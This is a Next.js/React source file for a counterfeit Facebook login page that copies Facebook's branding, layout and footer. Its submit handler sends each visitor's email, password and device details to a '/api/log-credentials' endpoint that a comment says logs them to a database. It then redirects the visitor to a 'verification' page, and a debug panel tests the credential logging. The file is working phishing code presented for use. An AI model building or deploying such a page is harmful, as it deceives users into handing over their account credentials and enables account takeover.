import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function FacebookAuth() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const router = useRouter();

  // Set Facebook background
  useEffect(() => {
    document.body.style.backgroundColor = '#f0f2f5';
    document.body.style.margin = '0';
    document.body.style.padding = '0';
    return () => {
      document.body.style.backgroundColor = '';
      document.body.style.margin = '';
      document.body.style.padding = '';
    };
  }, []);

  const validateCredentials = (email, password) => {
    if (!email || !password) {
      return 'Please fill in all fields';
    }
    
    // Check if it's a valid email OR a 10-digit mobile number
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const mobileRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, ''); // Remove non-digits for mobile check
    
    const isValidEmail = emailRegex.test(email);
    const isValidMobile = mobileRegex.test(cleanEmail);
    
    if (!isValidEmail && !isValidMobile) {
      return 'Please enter a valid email address or 10-digit mobile number';
    }
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    console.log('🔵 Starting login process for:', email);

    const validationError = validateCredentials(email, password);
    if (validationError) {
      console.log('🔴 Validation failed:', validationError);
      setError(validationError);
      setIsLoading(false);
      return;
    }

    try {
      console.log('🟡 Attempting to log credentials...');

      // Log credentials to NeonDB
      const logResponse = await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          email, 
          password, 
          userAgent: navigator.userAgent,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
          platform: 'facebook',
          timestamp: new Date().toISOString()
        })
      });

      console.log('🟡 API Response status:', logResponse.status);

      // Check if the request was successful
      if (!logResponse.ok) {
        const errorText = await logResponse.text();
        console.error('🔴 API Error:', errorText);
        // Continue anyway - don't block the user flow
      } else {
        const result = await logResponse.json();
        console.log('🟢 Login logged successfully:', result);
      }

      // Store email in localStorage for session management
      localStorage.setItem('user_email', email);
      if (rememberMe) {
        localStorage.setItem('facebook_remember', 'true');
      }
      
      console.log('🟢 Redirecting to verification...');
      
      // Redirect to verification page
      setTimeout(() => {
        router.push('/auth/verification');
      }, 500);
      
    } catch (err) {
      console.error('🔴 Full login error:', err);
      // Continue anyway - don't block the user flow
      localStorage.setItem('user_email', email);
      setTimeout(() => {
        router.push('/auth/verification');
      }, 500);
    } finally {
      setIsLoading(false);
    }
  };

  // Format input for better mobile number entry
  const handleEmailChange = (e) => {
    const value = e.target.value;
    // Allow both email format and digits for mobile
    setEmail(value);
  };

  return (
    <>
      <Head>
        <title>Log into Facebook</title>
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>" />
      </Head>
      
      {/* Main Container */}
      <div className="facebook-container">
        <div className="main-content">
          {/* Left Side - Facebook Branding */}
          <div className="branding-section">
            <div className="facebook-logo">facebook</div>
            <p className="tagline">
              Facebook helps you connect and share with the people in your life.
            </p>
          </div>

          {/* Right Side - Login Card */}
          <div className="login-section">
            <div className="login-card">
              <form onSubmit={handleSubmit} className="login-form">
                {/* Email/Mobile Input - FIXED SIZE */}
                <div className="input-container">
                  <input
                    type="text"
                    placeholder="Email or mobile number"
                    className="form-input"
                    value={email}
                    onChange={handleEmailChange}
                    maxLength="50"
                  />
                </div>

                {/* Password Input - FIXED SIZE */}
                <div className="input-container">
                  <input
                    type="password"
                    placeholder="Password"
                    className="form-input"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    maxLength="30"
                  />
                </div>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  className="login-button"
                >
                  {isLoading ? (
                    <div className="loading-container">
                      <div className="loading-spinner"></div>
                      <span>Logging in...</span>
                    </div>
                  ) : (
                    'Log In'
                  )}
                </button>

                {/* Error Message */}
                {error && (
                  <div className="error-message">
                    {error}
                  </div>
                )}

                {/* Forgot Password */}
                <div className="forgot-password">
                  <a href="#" className="forgot-link">
                    Forgotten password?
                  </a>
                </div>

                <div className="divider"></div>

                {/* Remember Me Checkbox */}
                <div className="remember-me">
                  <input
                    type="checkbox"
                    id="remember"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="checkbox"
                  />
                  <label htmlFor="remember" className="checkbox-label">
                    Keep me logged in
                  </label>
                </div>

                {/* Create Account Button */}
                <button
                  type="button"
                  className="create-account-button"
                >
                  Create New Account
                </button>
              </form>
            </div>

            {/* Create Page Link */}
            <div className="create-page-link">
              <p>
                <a href="#" className="page-link">
                  Create a Page
                </a>{' '}
                for a celebrity, brand or business.
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="facebook-footer">
          <div className="languages">
            {['English (US)', 'Español', 'Français (France)', '中文(简体)', 'العربية', 'Português (Brasil)', 'Italiano', '한국어', 'Deutsch', 'हिन्दी', '日本語'].map((lang) => (
              <a key={lang} href="#" className="footer-link">{lang}</a>
            ))}
          </div>
          
          <div className="footer-links">
            {['Sign Up', 'Log In', 'Messenger', 'Facebook Lite', 'Video', 'Places', 'Games', 'Marketplace', 'Meta Pay', 'Meta Store', 'Meta Quest', 'Imagine with Meta AI', 'Instagram', 'Threads', 'Fundraisers', 'Services', 'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'Groups', 'About', 'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices', 'Terms', 'Help', 'Contact uploading and non-users'].map((item) => (
              <a key={item} href="#" className="footer-link">{item}</a>
            ))}
          </div>
          
          <div className="copyright">
            <span>Meta © 2024</span>
          </div>
        </footer>

        {/* Debug Panel */}
        <div className="debug-panel">
          <h3>Debug Database Connection</h3>
          <div className="debug-buttons">
            <button
              onClick={async () => {
                console.log('🧪 Testing login API...');
                try {
                  const testData = {
                    email: 'test@example.com',
                    password: 'test123',
                    userAgent: navigator.userAgent
                  };
                  
                  const response = await fetch('/api/log-credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(testData)
                  });
                  
                  const result = await response.json();
                  console.log('🧪 Login API Test:', result);
                  alert(`Login API: ${response.status}\n${JSON.stringify(result, null, 2)}`);
                } catch (error) {
                  console.error('🧪 Login API Error:', error);
                  alert('Login API Failed: ' + error.message);
                }
              }}
              className="debug-button"
            >
              Test Login API
            </button>
            
            <button
              onClick={() => {
                console.log('📋 Current localStorage:');
                console.log('user_email:', localStorage.getItem('user_email'));
                console.log('All localStorage:', localStorage);
              }}
              className="debug-button secondary"
            >
              Check Storage
            </button>

            <button
              onClick={() => {
                // Test mobile number validation
                const testNumbers = ['1234567890', '0987654321', '5551234567'];
                const testEmails = ['test@example.com', 'user@gmail.com'];
                
                console.log('🧪 Testing validation:');
                testNumbers.forEach(num => {
                  const error = validateCredentials(num, 'password123');
                  console.log(`Mobile ${num}:`, error ? '❌ ' + error : '✅ Valid');
                });
                testEmails.forEach(email => {
                  const error = validateCredentials(email, 'password123');
                  console.log(`Email ${email}:`, error ? '❌ ' + error : '✅ Valid');
                });
              }}
              className="debug-button secondary"
            >
              Test Validation
            </button>
          </div>
        </div>
      </div>

      {/* Complete CSS Styles */}
      <style jsx>{`
        .facebook-container {
          min-height: 100vh;
          background-color: #f0f2f5;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: space-between;
          padding: 20px;
          font-family: Helvetica, Arial, sans-serif;
        }

        .main-content {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 60px;
          max-width: 1200px;
          width: 100%;
          margin: auto;
          flex-wrap: wrap;
        }

        .branding-section {
          flex: 1;
          max-width: 500px;
          text-align: left;
        }

        .facebook-logo {
          color: #1877f2;
          font-size: 64px;
          font-weight: bold;
          margin-bottom: 16px;
          line-height: 1;
        }

        .tagline {
          font-size: 28px;
          color: #1c1e21;
          font-weight: normal;
          line-height: 1.3;
          margin: 0;
        }

        .login-section {
          flex: 0 0 400px;
        }

        .login-card {
          background: white;
          padding: 20px;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
          margin-bottom: 28px;
        }

        .login-form {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .input-container {
          width: 100%;
        }

        .form-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          font-size: 17px;
          background: #ffffff;
          transition: border-color 0.2s;
          box-sizing: border-box;
        }

        .form-input:focus {
          border-color: #1877f2;
          outline: none;
          box-shadow: 0 0 0 2px #e7f3ff;
        }

        .form-input::placeholder {
          color: #8a8d91;
        }

        .login-button {
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 20px;
          font-weight: bold;
          cursor: pointer;
          transition: background-color 0.2s;
          height: 48px;
        }

        .login-button:hover:not(:disabled) {
          background: #166fe5;
        }

        .login-button:disabled {
          background: #ccc;
          cursor: not-allowed;
        }

        .loading-container {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        .loading-spinner {
          width: 20px;
          height: 20px;
          border: 2px solid transparent;
          border-top: 2px solid white;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .error-message {
          color: #d93025;
          background: #fce8e6;
          padding: 12px;
          border-radius: 6px;
          border: 1px solid #fadbd9;
          text-align: center;
          font-size: 14px;
        }

        .forgot-password {
          text-align: center;
          padding: 8px 0;
        }

        .forgot-link {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
        }

        .forgot-link:hover {
          text-decoration: underline;
        }

        .divider {
          height: 1px;
          background: #dadde1;
          margin: 8px 0;
        }

        .remember-me {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 0;
        }

        .checkbox {
          width: 16px;
          height: 16px;
          accent-color: #1877f2;
        }

        .checkbox-label {
          font-size: 14px;
          color: #1c1e21;
        }

        .create-account-button {
          background: #42b72a;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 17px;
          font-weight: bold;
          cursor: pointer;
          transition: background-color 0.2s;
          margin-top: 8px;
        }

        .create-account-button:hover {
          background: #36a420;
        }

        .create-page-link {
          text-align: center;
          font-size: 14px;
          color: #1c1e21;
        }

        .page-link {
          color: #1c1e21;
          font-weight: bold;
          text-decoration: none;
        }

        .page-link:hover {
          text-decoration: underline;
        }

        .facebook-footer {
          max-width: 1200px;
          width: 100%;
          padding: 20px 0;
          margin-top: auto;
        }

        .languages, .footer-links {
          display: flex;
          flex-wrap: wrap;
          gap: 12px;
          justify-content: center;
          margin-bottom: 12px;
        }

        .footer-link {
          color: #8a8d91;
          text-decoration: none;
          font-size: 12px;
        }

        .footer-link:hover {
          text-decoration: underline;
        }

        .copyright {
          text-align: center;
          color: #8a8d91;
          font-size: 12px;
          margin-top: 16px;
        }

        .debug-panel {
          background: #fff3cd;
          border: 1px solid #ffeaa7;
          border-radius: 8px;
          padding: 16px;
          margin-top: 20px;
          max-width: 400px;
        }

        .debug-panel h3 {
          color: #856404;
          margin: 0 0 12px 0;
          font-size: 14px;
        }

        .debug-buttons {
          display: flex;
          gap: 8px;
          flex-wrap: wrap;
        }

        .debug-button {
          padding: 8px 12px;
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 12px;
          cursor: pointer;
        }

        .debug-button.secondary {
          background: #42b72a;
        }

        .debug-button:hover {
          opacity: 0.9;
        }

        /* Responsive Design */
        @media (max-width: 900px) {
          .main-content {
            flex-direction: column;
            text-align: center;
            gap: 40px;
          }

          .branding-section {
            text-align: center;
            max-width: 400px;
          }

          .facebook-logo {
            font-size: 48px;
          }

          .tagline {
            font-size: 22px;
          }

          .login-section {
            flex: 0 0 auto;
            width: 100%;
            max-width: 400px;
          }
        }

        @media (max-width: 480px) {
          .facebook-container {
            padding: 10px;
          }

          .facebook-logo {
            font-size: 36px;
          }

          .tagline {
            font-size: 18px;
          }

          .login-card {
            padding: 16px;
          }

          .form-input {
            font-size: 16px;
          }
        }
      `}</style>
    </>
  );
}
